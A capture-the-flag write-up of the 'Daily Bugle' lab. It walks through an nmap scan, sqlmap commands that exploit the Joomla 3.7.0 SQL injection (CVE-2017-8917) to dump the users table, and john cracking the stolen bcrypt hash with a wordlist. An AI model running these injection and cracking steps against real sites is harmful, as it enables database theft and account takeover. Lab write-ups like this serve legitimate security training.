## Daily Bugle 
Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum. 

### Recon
- When visited the web server, looks like a kind of news website and it has one post about "Super Man" (Answer to the first question)  robbed the bank and was published by a "Super User". 

- There is a login section, but credentials are unknown at this time. 
-  Running the `nmap` to find more hidden information: 
-


    $ nmap -sC -sV --script=vuln 10.10.89.194 
    
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
    |_clamav-exec: ERROR: Script execution failed (use -d to debug)
    | vulners: 
    |   cpe:/a:openbsd:openssh:7.4: 
    |       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919
    |       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906
    |_      CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
    80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
    |_clamav-exec: ERROR: Script execution failed (use -d to debug)
    | http-csrf: 
    | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.89.194
    |   Found the following possible CSRF vulnerabilities: 
    |     
    |     Path: http://10.10.89.194:80/
    |     Form id: login-form
    |     Form action: /index.php
    |     
    |     Path: http://10.10.89.194:80/index.php/2-uncategorised/1-spider-man-robs-bank
    |     Form id: login-form
    |     Form action: /index.php
    |     
    |     Path: http://10.10.89.194:80/index.php/component/users/?view=reset&amp;Itemid=101
    |     Form id: user-registration
    |     Form action: /index.php/component/users/?task=reset.request&Itemid=101
    |     
    |     Path: http://10.10.89.194:80/index.php/component/users/?view=reset&amp;Itemid=101
    |     Form id: login-form
    |     Form action: /index.php/component/users/?Itemid=101
    |     
    |     Path: http://10.10.89.194:80/index.php/component/users/?view=remind&amp;Itemid=101
    |     Form id: user-registration
    |     Form action: /index.php/component/users/?task=remind.remind&Itemid=101
    |     
    |     Path: http://10.10.89.194:80/index.php/component/users/?view=remind&amp;Itemid=101
    |     Form id: login-form
    |     Form action: /index.php/component/users/?Itemid=101
    |     
    |     Path: http://10.10.89.194:80/index.php/2-uncategorised
    |     Form id: login-form
    |     Form action: /index.php
    |     
    |     Path: http://10.10.89.194:80/index.php
    |     Form id: login-form
    |_    Form action: /index.php
    | http-dombased-xss: 
    | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.89.194
    |   Found the following indications of potential DOM based XSS: 
    |     
    |     Source: window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no')
    |_    Pages: http://10.10.89.194:80/, http://10.10.89.194:80/index.php/2-uncategorised/1-spider-man-robs-bank, http://10.10.89.194:80/index.php/2-uncategorised, http://10.10.89.194:80/index.php
    | http-enum: 
    |   /administrator/: Possible admin folder
    |   /administrator/index.php: Possible admin folder
    |   /robots.txt: Robots file
    |   /administrator/manifests/files/joomla.xml: Joomla version 3.7.0
    |   /language/en-GB/en-GB.xml: Joomla version 3.7.0
    |   /htaccess.txt: Joomla!
    |   /README.txt: Interesting, a readme.
    |   /bin/: Potentially interesting folder
    |   /cache/: Potentially interesting folder
    |   /icons/: Potentially interesting folder w/ directory listing
    |   /images/: Potentially interesting folder
    |   /includes/: Potentially interesting folder
    |   /libraries/: Potentially interesting folder
    |   /modules/: Potentially interesting folder
    |   /templates/: Potentially interesting folder
    |_  /tmp/: Potentially interesting folder
    |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    |_http-trace: TRACE is enabled
    | http-vuln-cve2017-8917: 
    |   VULNERABLE:
    |   Joomla! 3.7.0 'com_fields' SQL Injection Vulnerability
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2017-8917
    |     Risk factor: High  CVSSv3: 9.8 (CRITICAL) (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
    |       An SQL injection vulnerability in Joomla! 3.7.x before 3.7.1 allows attackers
    |       to execute aribitrary SQL commands via unspecified vectors.
    |       
    |     Disclosure date: 2017-05-17
    |     Extra information:
    |       User: root@localhost
    |     References:
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8917
    |_      https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
    | vulners: 
    |   cpe:/a:apache:http_server:2.4.6: 
    |       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
    |       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
    |       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
    |       CVE-2014-0226   6.8     https://vulners.com/cve/CVE-2014-0226
    |       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788
    |       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
    |       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
    |       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
    |       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
    |       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
    |       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
    |       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798
    |       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
    |       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743
    |       CVE-2016-2161   5.0     https://vulners.com/cve/CVE-2016-2161
    |       CVE-2016-0736   5.0     https://vulners.com/cve/CVE-2016-0736
    |       CVE-2014-3523   5.0     https://vulners.com/cve/CVE-2014-3523
    |       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231
    |       CVE-2014-0098   5.0     https://vulners.com/cve/CVE-2014-0098
    |       CVE-2013-6438   5.0     https://vulners.com/cve/CVE-2013-6438
    |       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
    |       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975
    |       CVE-2015-3185   4.3     https://vulners.com/cve/CVE-2015-3185
    |       CVE-2014-8109   4.3     https://vulners.com/cve/CVE-2014-8109
    |       CVE-2014-0118   4.3     https://vulners.com/cve/CVE-2014-0118
    |       CVE-2014-0117   4.3     https://vulners.com/cve/CVE-2014-0117
    |       CVE-2013-4352   4.3     https://vulners.com/cve/CVE-2013-4352
    |       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
    |_      CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612
    3306/tcp open  mysql   MariaDB (unauthorized)
    |_clamav-exec: ERROR: Script execution failed (use -d to debug)
    |_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)


- From above results: 
	- port 22 for SSH
	-  80 for web server and 
	- 3306 for mysql (MariaDB)
	- Also the robots.txt shows there is a Joomla running on this server and with version 3.7.0 
	- The /administrator page contains the Joomla login. 
	- The Joomla 3.7.0 is vulnerable for SQL injection as described in [CVE-2017-8917](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8917)

### Exploiting the Joomla 

Using the known SQL injection vulnerability and the [exploit](https://www.exploit-db.com/exploits/42033), lets exploit the Joomla. 

    sqlmap -u "http://10.10.89.194/administrator/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] 

    [22:17:15] [INFO] the back-end DBMS is MySQL
    back-end DBMS: MySQL >= 5.0 (MariaDB fork)
    [22:17:15] [INFO] fetching database names
    [22:17:15] [INFO] resumed: 'information_schema'
    [22:17:15] [INFO] resumed: 'joomla'
    [22:17:15] [INFO] resumed: 'mysql'
    [22:17:15] [INFO] resumed: 'performance_schema'
    [22:17:15] [INFO] resumed: 'test'
    available databases [5]:
    [*] information_schema
    [*] joomla
    [*] mysql
    [*] performance_schema
    [*] test
    

The result shows there are five databases and let's try the database "***joomla***". So lets see what tables are there in this database: 

    sqlmap -u "http://10.10.249.249/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --random-agent --dbs -p list[fullordering] --threads 10 -D joomla --tables

The above returned a total of 72 tables and there is one interesting table ***'#__users***'; sounds like users details.

    sqlmap -u "http://10.10.249.249/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --random-agent --dbs -p list[fullordering] --threads 10 -D joomla -T "#__users" --dump 
    Database: joomla
    Table: #__users
    [1 entry]
    +------+---------------------+------------+---------+----------+--------------------------------------------------------------+
    | id   | email               | name       | params  | username | password                                                     |
    +------+---------------------+------------+---------+----------+--------------------------------------------------------------+
    | 811  | jonah@tryhackme.com | Super User | <blank> | jonah    | $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm |
    +------+---------------------+------------+---------+----------+--------------------------------------------------------------+


The table has the user name **jonah** with hashed password `$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm`. 

Using the `john`, lets crack the hashed password to get the plain text: 

    $ john jonah_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
    Using default input encoding: UTF-8
    Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
    Cost 1 (iteration count) is 1024 for all loaded hashes
    Will run 4 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    0g 0:00:00:11 0.01% (ETA: 2020-07-10 05:35) 0g/s 86.17p/s 86.17c/s 86.17C/s twilight..mariel
    0g 0:00:01:44 0.05% (ETA: 2020-07-10 12:13) 0g/s 78.80p/s 78.80c/s 78.80C/s nutter..teamodios
    0g 0:00:01:45 0.05% (ETA: 2020-07-10 12:15) 0g/s 78.85p/s 78.85c/s 78.85C/s 101289..beckham23
    0g 0:00:01:48 0.05% (ETA: 2020-07-10 12:22) 0g/s 78.57p/s 78.57c/s 78.57C/s 474747..coucou
    0g 0:00:02:47 0.07% (ETA: 2020-07-10 13:23) 0g/s 76.82p/s 76.82c/s 76.82C/s Nathan..robinho
    spiderman123     (?)
    1g 0:00:09:31 DONE (2020-07-07 23:15) 0.001751g/s 82.02p/s 82.02c/s 82.02C/s thelma1..speciala
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed

Login to Joomla with the above credentials. 
